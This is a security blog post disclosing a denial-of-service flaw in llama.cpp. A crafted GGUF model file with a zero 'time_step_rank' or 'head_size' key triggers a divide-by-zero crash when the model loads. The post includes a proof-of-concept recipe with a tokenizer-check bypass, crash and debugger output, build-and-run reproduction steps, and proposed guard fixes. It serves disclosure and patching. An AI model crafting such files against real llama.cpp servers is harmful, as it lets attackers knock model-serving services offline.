---
title: "Zero Validation, Zero Division: DoS in llama.cpp SSM and RWKV Model Loading via Crafted GGUF"
source: https://trexnegro.github.io/posts/gguf-sigfpe-dos-mamba2-granite-nemotron-rwkv6/
source_host: trexnegro.github.io
clip_date: 2026-11-09T22:38:39+08:00
trace_id: 1240aa73-b36a-4cec-ba4d-bdbb63b71a8d
content_hash: aa527e110834ade2aec6dd2d771c79c1187b506a1f4fc0abc8c6037cc0390f84
status: synced
tags: []
series: null
feed_source: SixSixSix·Android内核漏洞
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41375244-d011-81ed-b708-f59317845ec8
ioc: null
---

> **TL;DR**— llama.cpp reads `ssm_dt_rank` and `wkv_head_size` from the GGUF key-value section and uses them as divisors during tensor backend selection without checking they are non-zero. Setting either key to zero in a crafted GGUF causes SIGFPE in `weight_buft_supported()` during model loading. The GDB stack trace shows the signal in a llama-server worker thread at `server_context_impl::load_model()`. PoC is 32 KB. Fix is a one-line guard in each `load_arch_hparams()`. Affected: `mamba2`, `granite-hybrid`, `nemotron-h`, `rwkv6`. Exit code 136 (128 + SIGFPE).

* * *

## Root cause

`weight_buft_supported()` in `llama-model-loader.cpp` probes each weight tensor against available backends by constructing a temporary op. For `GGML_OP_SSM_SCAN` (assigned to `ssm_a` tensors in SSM architectures) the probe computes:

```cpp
// llama-model-loader.cpp:1023-1028
case GGML_OP_SSM_SCAN: {
    const int64_t d_state  = w->ne[0] == 1 ? hparams.ssm_d_state : w->ne[0];
    const int64_t n_head   = w->ne[1];
    const int64_t head_dim = hparams.ssm_d_inner / n_head;   // ← SIGFPE when n_head == 0
```

`w->ne[1]` is the second dimension of `ssm_a`. For Mamba-2 that dimension is set at tensor creation time:

```cpp
// mamba2.cpp:75
layer.ssm_a = create_tensor(tn(LLM_TENSOR_SSM_A, i), {1, dt_rank}, 0);
// dt_rank = hparams.ssm_dt_rank
```

`hparams.ssm_dt_rank` is loaded directly from the GGUF KV key `mamba2.ssm.time_step_rank` with no non-zero check. Setting that key to `0` in the file sets `dt_rank = 0`, `ssm_a.ne[1] = 0`, `n_head = 0`, and the division faults.

The same division fires for `granite-hybrid` and `nemotron-h`, which share the same tensor creation idiom:

```cpp
// granite-hybrid.cpp:85, nemotron-h.cpp:95
layer.ssm_a = create_tensor(tn(LLM_TENSOR_SSM_A, i), {1, n_ssm_head}, 0);
// n_ssm_head = hparams.ssm_dt_rank
```

For RWKV-6 the crash is at a different site but the same class of missing guard:

```cpp
// rwkv6.cpp:42
const int head_size = hparams.wkv_head_size;   // from rwkv6.wkv.head_size

// rwkv6.cpp:67
layer.time_mix_first = create_tensor(tn(LLM_TENSOR_TIME_MIX_FIRST, i),
                                     {head_size, n_embd / head_size}, 0);
//                                               ^^^^^^^^^^^^^^^^^^^ SIGFPE
```

`n_embd / head_size` evaluates before `create_tensor` is called. `head_size = 0` produces SIGFPE.

A secondary site exists for the SSM path in `mamba-base.cpp:165`, which fires during inference graph construction if `ssm_dt_rank = 0` reaches that stage:

```cpp
// mamba-base.cpp:162-165
const int64_t n_head   = hparams.ssm_dt_rank;
const int64_t head_dim = d_inner / n_head;        // ← SIGFPE
```

In practice `weight_buft_supported()` faults first, so this site is never reached via the PoC. A fix that patches only the loading path would leave this open.

* * *

## Why the GGUF parser doesn’t catch it

The dimension validation at `gguf.cpp:692` only rejects negative values:

```cpp
if (info.t.ne[j] < 0) {   // 0 passes
```

A tensor with `ne[1] = 0` is structurally valid. `ggml_nbytes()` returns 0 for it, no data is allocated, and it passes all subsequent checks. The shape validator `check_tensor_dims()` compares loaded shape against expected shape. Since the expected shape is computed from the same `hparams.ssm_dt_rank` that is zero, expected `{1, 0}` matches loaded `{1, 0}` and passes.

The KV entry itself is a fully spec-compliant GGUF encoding:

```
key:   "mamba2.ssm.time_step_rank"
type:  GGUF_TYPE_UINT32 (0x04)
value: 0x00000000
```

The full path zero takes through the validation stack:

```
gguf.cpp:692          ne[j] < 0 ?         no  → passes
check_tensor_dims()   {1,0} == {1,0} ?    yes → passes
load_arch_tensors()   ssm_a ne = {1, 0}       → no guard
weight_buft_supported()  d_inner / 0          → SIGFPE
```

* * *

## Proof of concept

The PoC GGUF is 32 KB. Only two fields matter:

```python
kv += pack_kv_uint32("mamba2.ssm.time_step_rank", 0)   # trigger

("blk.0.ssm_a", [1, 0], GGML_TYPE_F32),                # ne[1] = 0
```

The tokenizer requires a separate bypass. llama.cpp enforces BPE merge tables when `tokenizer.ggml.model = "gpt2"`. Setting `tokenizer.ggml.pre = "kimi-k2"` hits a branch in `llama-vocab.cpp:2300` that skips the merge table requirement for Kimi-K2’s pre-tokenizer, letting the model proceed past tokenizer initialization into tensor loading where the fault occurs.

* * *

## Runtime output

```
$ llama-cli -m poc_mamba2_sigfpe.gguf -p "hi" -n 1
llama_model_load: loading model from poc_mamba2_sigfpe.gguf
llama_model_load: model type = mamba2
llama_model_load: n_layer = 1, n_embd = 32
Floating point exception (core dumped)

$ echo $?
136
```

GDB:

```php
Thread 6 "llama-cli" received signal SIGFPE, Arithmetic exception.
0x00007ffff64e2d82 in select_weight_buft(llama_hparams const&, ggml_tensor*, ...)

#0  select_weight_buft(...)      llama-model-loader.cpp:1028   ← fault
#1  llama_model_loader::create_tensor(...)   llama-model-loader.cpp:1360
#2  llama_model_loader::create_tensor(...)   llama-model-loader.cpp:1210
#3  llama_model_base::create_tensor(...)     llama-model-loader.cpp:1420
#4  llama_model_mamba2::load_arch_tensors(...)   mamba2.cpp:75
#5  llama_model_base::load_tensors(...)
#6  llama_model_load_from_file_impl(...)
#7  llama_model_load_from_file(...)
...
#14 server_context_impl::load_model(...)    server.cpp:1891   ← server confirmed
#15 server_run(...)
```

Frame `#4` is `mamba2.cpp:75` — the `create_tensor(..., {1, dt_rank}, 0)` call with `dt_rank = 0`. Frame `#14` confirms the signal reaches `server_context_impl::load_model()`, meaning llama-server is killed on model load with no recovery.

* * *

## Affected architectures

| Architecture | Trigger key | Crash site |
| --- | --- | --- |
| `mamba2` | `mamba2.ssm.time_step_rank` | `llama-model-loader.cpp:1028` |
| `granite-hybrid` | `granite-hybrid.ssm.time_step_rank` | `llama-model-loader.cpp:1028` |
| `nemotron-h` | `nemotron-h.ssm.time_step_rank` | `llama-model-loader.cpp:1028` |
| `rwkv6` | `rwkv6.wkv.head_size` | `rwkv6.cpp:67` |

Production models on these architectures: IBM Granite 3.3 Hybrid, NVIDIA Nemotron-H 47B/56B, state-spaces Mamba-2 family, RWKV-6-World / Eagle / Finch.

* * *

## Fix

Add non-zero guards in `load_arch_hparams()` for each architecture, after the KV value is read:

```cpp
// mamba2.cpp, granite-hybrid.cpp, nemotron-h.cpp
if (hparams.ssm_dt_rank == 0) {
    throw std::runtime_error("ssm_dt_rank must be > 0");
}
```

```cpp
// rwkv6.cpp
if (hparams.wkv_head_size == 0) {
    throw std::runtime_error("wkv_head_size must be > 0");
}
```

Defense-in-depth: change `gguf.cpp:692` from `ne[j] < 0` to `ne[j] <= 0`. This rejects zero-dimension tensors at the parser level before any architecture-specific code runs.

* * *

## Reproducing

```bash
git clone https://github.com/ggml-org/llama.cpp
cd llama.cpp && cmake -B build && cmake --build build -j$(nproc) --target llama-cli

python3 gen_mamba2_sigfpe.py
./build/bin/llama-cli -m poc_mamba2_sigfpe.gguf -p "test" -n 1
# Floating point exception (core dumped)
# exit 136
```

Generator and PoC GGUF: **[github.com/TREXNEGRO/Research](https://github.com/TREXNEGRO/Research)**

* * *

*Tested on llama.cpp commit `9f0e509` (ggml 0.29.0). SIGFPE confirmed at `llama-model-loader.cpp:1028`, exit code 136, `server_context_impl::load_model()` in GDB trace.*
